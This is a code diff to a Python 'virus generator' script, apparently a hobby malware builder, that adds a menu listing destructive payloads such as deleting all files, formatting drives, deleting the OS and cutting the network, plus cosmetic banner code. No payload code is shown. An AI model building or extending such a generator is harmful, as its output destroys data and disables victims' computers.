@@ -22,6 +22,7 @@ def banner1():
    Virus|Generator
 	""")
 	print(y+"By: Anikin Luke\n")
+	print(v+"Type -h or 'help' to show commands\n")
 
 
 def banner2():
@@ -101,13 +102,23 @@ def winhelp():
 	==============================================
 	+|VirGen VirusGenerator coded By:Anikin Luke|+
 	==============================================
-	+|     COMMANDS            Decription       |+
+	+|     COMMANDS             Name            |+
 	+|------------------------------------------|+
-	+|   [1] =======   	 Overload Virus         |+
-	+|   [2] =======	 			            |+
-	+|   [3] =======			                |+
-	+|   [4] =======  						    |+
-	+|   [5] ================== About Us        |+
+	+|   [1] ======> Overload Virus             |+
+	+|   [2] ======> Delete All Files Virus     |+
+	+|   [3] ======> The Blue Screen Of Death   |+
+	+|   [4] ======> You A Fool keyboard        |+
+	+|   [5] ======> C,D,E Drive Format         |+
+	+|   [6] =====>Shutdown pc unable to turn on|+
+	+|   [7] ======> user account flooder       |+
+	+|   [8] ======> Delete Os/System           |+
+	+|   [9] ======> Endless Notepads           |+
+	+|   [10] =====> Bomb Virus                 |+
+	+|   [11] =====> Task Kill                  |+
+	+|   [12] =====> Net Gone/cut               |+				
+	+|   [666] ====> Create All                 |+	
+	+|                                          |+		
+	+|   [x] ================== About Us        |+
 	+|                                          |+
 	+|   [0] =================== Exit           |+
 	+|                                          |+
@@ -136,5 +147,26 @@ def error():
 	time.sleep(.1)
 	os.system("clear")
 	banner1()
+
+
+def winerror():
+	time.sleep(2)
+	os.system("clear")
+	print("\n\nE")
+	time.sleep(.1)
+	os.system("clear")
+	print("\n\nEr")
+	time.sleep(.1)
+	os.system("clear")
+	print("\n\nErr")		
+	time.sleep(.1)
+	os.system("clear")
+	print("\n\nErro")		
+	time.sleep(.1)
+	os.system("clear")
+	print("\n\nError!")
+	time.sleep(.1)
+	os.system("clear")
+	banner2()
 
 
